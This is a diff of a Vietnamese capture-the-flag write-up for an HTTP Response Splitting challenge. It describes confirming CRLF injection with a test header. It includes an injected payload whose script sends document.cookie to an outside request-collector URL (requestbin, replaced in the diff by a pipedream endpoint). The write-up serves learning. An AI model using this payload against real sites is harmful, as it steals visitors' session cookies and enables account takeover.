@@ -6,7 +6,7 @@ Khi mở trang web lên thì mình nhận được yêu cầu phải chọn ngô
 
 ![anh1](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/HTTPRessplit_1.png)
 
-Thông qua việc tìm hiểu các tài liệu về HTTP Response Splitting, mình biết rằng mình có thể kiểm tra xem trang web có thể bị inject không  bằng việc sử dụng CLRF injection (sử dụng các kí tự \r\n để tạo xuống dòng trong request). Mình đã thử sử dụng và thêm vào 1 trường test=true. Sau khi kiểm tra response thì mình thấy dưới trường Set-Cookie của response có thêm trường test=true, tức là mình có thể thực hiện inject được.
+Thông qua việc tìm hiểu các tài liệu về HTTP Response Splitting, mình biết rằng mình có thể kiểm tra xem trang web có thể bị inject không  bằng việc sử dụng CLRF injection (sử dụng các kí tự `\r\n` để tạo xuống dòng trong request). Mình đã thử sử dụng và thêm vào 1 trường test=true. Sau khi kiểm tra response thì mình thấy dưới trường Set-Cookie của response có thêm trường test=true, tức là mình có thể thực hiện inject được.
 
 ![anh2](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/HTTPRessplit_2.PNG)
 
@@ -20,7 +20,7 @@ Mình viết thêm đoạn payload như sau:
 \r\nLast-modified: Thu, 01, Jan 2100 12:00:00 GMT
 \r\nContent-Length: 138
 \r\n
-\r\n<script>document.write("<h1>test</h1><img src=http://requestbin.fullcontact.com/148xfw11?".concat(document.cookie).concat(" />"))</script>
+\r\n<script>document.write("<h1>test</h1><img src=http://eoyoae37hp6q6ss.m.pipedream.net".concat(document.cookie).concat(" />"))</script>
 
 ```
 
